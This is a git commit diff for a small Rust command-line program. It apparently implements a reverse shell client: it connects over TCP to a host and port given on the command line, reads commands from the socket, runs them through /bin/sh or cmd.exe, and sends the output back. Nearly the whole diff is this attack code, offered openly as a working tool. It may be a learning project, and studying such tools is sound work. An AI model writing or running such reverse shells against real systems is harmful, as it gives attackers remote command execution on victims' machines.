16bde2ca0ca7ad84983dce89a9317b1802ea595d
Sam (eremus) <sam@eremus.dev>
2022-02-19 11:21:50 +1100

    finish command exec cycle

--- src/main.rs
+++ src/main.rs
@@ -1,7 +1,10 @@
 extern crate clap;
 use clap::{App, Arg};
 
+use std::io::{Read, Write};
 use std::process::Command;
+use std::thread::sleep;
+use std::time::Duration;
 use std::{env, net::TcpStream};
 
 fn main() {
@@ -25,23 +28,57 @@ fn main() {
 
     let port = matches.value_of("port").unwrap();
     let host = matches.value_of("host").unwrap();
-    let client_type = env::consts::FAMILY;
 
     println!("[*] Creating connection to {host}:{port}");
-    let mut stream = TcpStream::connect(format!("{}:{}", host, port));
+    let stream = TcpStream::connect(format!("{}:{}", host, port));
 
     match stream {
-        Ok(succ) => {
+        Ok(mut succ) => {
             println!("[*] Connection successful.");
-            command_exec_listener(succ, client_type);
+            command_exec_listener(&mut succ);
         }
         Err(e) => {
             println!("[*] Failed to create connection with error {e}");
-            return;
         }
     }
 }
 
-fn command_exec_listener(stream: TcpStream, client_fam: &str) -> ! {
-    loop {}
+fn get_os_fam() -> Vec<String> {
+    match env::consts::FAMILY {
+        "linux" => vec!["/bin/sh".to_string(), "-c".to_string()],
+        "windows" => vec!["cmd.exe".to_string(), "/C".to_string()],
+        _ => panic!("Random OS family"),
+    }
+}
+
+fn command_exec_listener(stream: &mut TcpStream) -> ! {
+    let cmd = get_os_fam();
+    let mut buf = vec![];
+
+    loop {
+        let size = stream.read(&mut buf);
+        let cmd_arg = buf.iter().map(|x| *x as char).collect::<String>();
+        match size {
+            Err(e) => match write!(stream, "Failure to read from stream with error {e}") {
+                Ok(_) => println!("Successfully wrote to stream"),
+                Err(e) => println!("Failed to write to stream with error {e}"),
+            },
+            Ok(_) => {
+                match write!(
+                    stream,
+                    "{:?}",
+                    Command::new(&cmd[0])
+                        .arg(&cmd[1])
+                        .arg(&cmd_arg)
+                        .output()
+                        .expect("failed to exec command")
+                ) {
+                    Ok(_) => println!("Successfully returned result for command"),
+                    Err(e) => println!("Failed to return result for command with error {e}"),
+                }
+            }
+        }
+        sleep(Duration::new(5, 0));
+        buf.clear();
+    }
 }
